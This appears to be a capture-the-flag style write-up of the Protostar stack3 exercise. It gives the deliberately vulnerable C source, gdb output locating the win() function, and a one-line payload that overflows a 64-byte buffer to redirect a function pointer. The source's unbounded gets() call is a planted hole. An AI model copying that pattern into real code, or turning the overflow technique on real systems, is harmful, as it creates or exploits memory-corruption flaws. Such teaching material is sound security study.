### Source Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

### Analysis:
```python
gdb-peda$ info functions 
All defined functions:

File stack3/stack3.c:
11:     int main(int, char **);
6:      void win(void);

Non-debugging symbols:
0x080482e0  _init
0x08048320  __gmon_start__@plt
0x08048330  gets@plt
0x08048340  __libc_start_main@plt
0x08048350  printf@plt
0x08048360  puts@plt
0x08048370  _start
0x080483a0  __do_global_dtors_aux
0x08048400  frame_dummy
0x08048480  __libc_csu_fini
0x08048490  __libc_csu_init
0x080484ea  __i686.get_pc_thunk.bx
0x080484f0  __do_global_ctors_aux
0x0804851c  _fini
gdb-peda$ disassemble  win
Dump of assembler code for function win:
   0x08048424 <+0>:     push   ebp
   0x08048425 <+1>:     mov    ebp,esp
   0x08048427 <+3>:     sub    esp,0x18
   0x0804842a <+6>:     mov    DWORD PTR [esp],0x8048540
   0x08048431 <+13>:    call   0x8048360 <puts@plt>
   0x08048436 <+18>:    leave  
   0x08048437 <+19>:    ret    
End of assembler dump.
gdb-peda$
```
so address of win function is 0x08048424 we will send "A"\*64 +little endian( 0x08048424)

### Exploit:
```bash
python -c 'print "A"*64 + "\x24\x84\x04\x08"' | ./stack3
```

![[Pasted image 20210724142844.png]]